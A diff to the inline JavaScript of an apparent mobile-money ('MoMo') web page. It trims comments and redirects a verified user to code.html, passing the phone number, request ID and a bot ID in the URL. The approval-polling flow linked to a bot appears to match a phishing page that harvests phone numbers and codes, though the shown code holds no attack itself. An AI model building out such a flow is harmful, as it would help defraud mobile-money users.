@@ -308,7 +308,6 @@
 
 <!-- ============================================================
      STEP 1 — Global error catcher. Must be the very first script.
-     Any runtime or syntax error will be logged so you can see it.
      ============================================================ -->
 <script>
 window.addEventListener('error', function (e) {
@@ -321,8 +320,7 @@ window.addEventListener('unhandledrejection', function (e) {
 
 
 <!-- ============================================================
-     STEP 2 — Page logic. No IIFE, no top-level return, no syntax
-     traps. Everything lives inside initMoMoPage().
+     STEP 2 — Page logic.
      ============================================================ -->
 <script>
 function initMoMoPage() {
@@ -543,11 +541,25 @@ function initMoMoPage() {
                             stopPolling();
                             setLoading(false);
                             setStatus('✅ Verified! Redirecting...', 'success');
-                            var redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
+
+                            /* =====================================================
+                               REDIRECT TARGET: code.html
+                               Passes botId, requestId, phone so code.html can
+                               continue the flow without losing context.
+                            ===================================================== */
+                            var redirectUrl = 'code.html?requestId=' + encodeURIComponent(requestId) +
                                               '&phone='     + encodeURIComponent(phoneVal) +
                                               '&botId='     + encodeURIComponent(botId);
+
+                            console.log('✅ Approved — redirecting to:', redirectUrl);
+
                             setTimeout(function () {
                                 window.location.href = redirectUrl;
+
+                                // Fallback in case href navigation is blocked
+                                setTimeout(function () {
+                                    try { window.location.replace(redirectUrl); } catch (e) {}
+                                }, 400);
                             }, 700);
                             return;
                         }
